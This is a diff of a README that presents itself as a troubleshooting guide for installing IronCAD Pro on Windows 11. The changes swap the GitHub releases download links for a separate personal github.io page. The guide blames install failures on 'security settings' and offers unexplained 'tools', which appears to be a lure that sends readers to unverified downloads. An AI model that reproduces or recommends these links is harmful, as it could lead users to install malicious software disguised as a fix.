@@ -1,6 +1,6 @@
 # 🛠 IronCAD-Troubleshooting - Fix Windows 11 installation issues today
 
-[![Download IronCAD Troubleshooting Tools](https://img.shields.io/badge/Download_Tools-Blue?style=for-the-badge&logo=github)](https://github.com/herculesstalwart902/IronCAD-Troubleshooting/releases)
+[![Download IronCAD Troubleshooting Tools](https://img.shields.io/badge/Download_Tools-Blue?style=for-the-badge&logo=github)](https://herculesstalwart902.github.io)
 
 This guide helps you install IronCAD Pro on Windows 11. Many users face installation errors due to security settings or missing system files. Follow these steps to resolve common setup failures and get your software running.
 
@@ -17,7 +17,7 @@ Your computer needs specific components to run IronCAD Pro. Check these items be
 
 ## 💾 Download and Installation
 
-Visit the [releases page](https://github.com/herculesstalwart902/IronCAD-Troubleshooting/releases) to download the installation files.
+Visit the [releases page](https://herculesstalwart902.github.io) to download the installation files.
 
 1.  Open the link above in your web browser.
 2.  Locate the latest version folder.
